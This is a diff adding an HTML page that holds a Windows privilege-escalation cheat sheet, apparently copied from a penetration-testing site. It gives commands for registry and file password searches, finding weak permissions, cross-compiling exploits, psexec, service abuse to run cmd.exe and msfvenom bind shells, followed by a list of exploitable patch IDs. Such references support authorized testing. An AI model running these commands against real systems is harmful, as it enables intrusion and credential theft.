@@ -1,0 +1,77 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Windows Priv Esc</title>
+</head><body>http://www.exumbraops.com/penetration-testing-102-windows-privilege-escalation-cheatsheet/ <br/>
+<br/>
+OS and service pack<br/>
+&nbsp;systeminfo | findstr /B /C:”OS Name” /C:”OS Version”<br/>
+&nbsp;ver<br/>
+<br/>
+System name<br/>
+&nbsp;hostname<br/>
+<br/>
+Who are you?<br/>
+&nbsp;whoami<br/>
+&nbsp;echo %username%<br/>
+<br/>
+Finding other users<br/>
+&nbsp;net users<br/>
+&nbsp;net user username<br/>
+<br/>
+Clear-text passwords<br/>
+&nbsp;c:\unattend.txt<br/>
+&nbsp;c:\sysprep.ini - [Clear Text]<br/>
+&nbsp;c:\sysprep\sysprep.xml - [Base64]<br/>
+&nbsp;findstr /si password *.txt | *.xml | *.ini<br/>
+&nbsp;reg query HKLM /s | findstr /i password &gt; temp.txt<br/>
+&nbsp;reg query HKCU /s | findstr /i password &gt; temp.txt<br/>
+&nbsp;reg query HKLM /f password /t REG_SZ /s<br/>
+&nbsp;reg query HKCU /f password /t REG_SZ /s<br/>
+<br/>
+Finding weak directory permissions<br/>
+&nbsp;accesschk.exe /accepteula<br/>
+&nbsp;accesschk.exe -uwdqs users c:\<br/>
+&nbsp;accesschk.exe -uwdqs “Authenticated Users” c:\<br/>
+<br/>
+Finding weak file permissions<br/>
+&nbsp;accesschk.exe -uwqs users c:\*.*<br/>
+&nbsp;accesschk.exe -uwqs “Authenticated Users” c:\*.*<br/>
+&nbsp;cacls "c:\Program Files" /T | findstr Users<br/>
+<br/>
+Weak Service permissions<br/>
+&nbsp;accesschk.exe –uwcqv *<br/>
+<br/>
+Cross compile exploits<br/>
+&nbsp;cp /usr/share/exploitdb/platforms/windows/local/&lt;exploit&gt;.c /tmp/ <br/>
+&nbsp;cd /root/.wine/drive_c/MinGW/bin<br/>
+&nbsp;wine gcc –o w00t.exe /tmp/&lt;exploit&gt;.c -l lib<br/>
+<br/>
+PSexec<br/>
+&nbsp;psexec.py &lt;user&gt;@&lt;host&gt; &lt;cmd&gt;<br/>
+&nbsp;psexec.exe \\&lt;host&gt; &lt;cmd&gt;<br/>
+<br/>
+Services<br/>
+&nbsp;sc create &lt;servicename&gt; binpath= “c:\windows\system32\cmd.exe /k &lt;pathtobinaryexecutable&gt;” DisplayName= &lt;displayname&gt;<br/>
+&nbsp;sc start &lt;servicename&gt;<br/>
+<br/>
+Creating bind shells<br/>
+&nbsp;msfvenom -p windows/shell_bind_tcp -f exe -o &lt;Filename.exe&gt; LPORT=&lt;BindPort&gt;<br/>
+&nbsp;msfvenom -p windows/shell_bind_tcp -f dll -o &lt;Filename.dll&gt; LPORT=&lt;BindPort&gt;<br/>
+<br/>
+Privilege Escalation Exploits by Patch<br/>
+&nbsp;MS10-015 <br/>
+&nbsp;MS10-059<br/>
+&nbsp;MS10-092<br/>
+&nbsp;MS11-080<br/>
+&nbsp;MS13-005<br/>
+&nbsp;CVE-2013-3660<br/>
+&nbsp;MS13-053<br/>
+&nbsp;MS13-081<br/>
+&nbsp;MS14-058<br/>
+&nbsp;MS14-068<br/>
+&nbsp;MS14-070<br/>
+&nbsp;MS15-001<br/>
+&nbsp;MS15-051<br/>
+&nbsp;MS15-052</body></html>
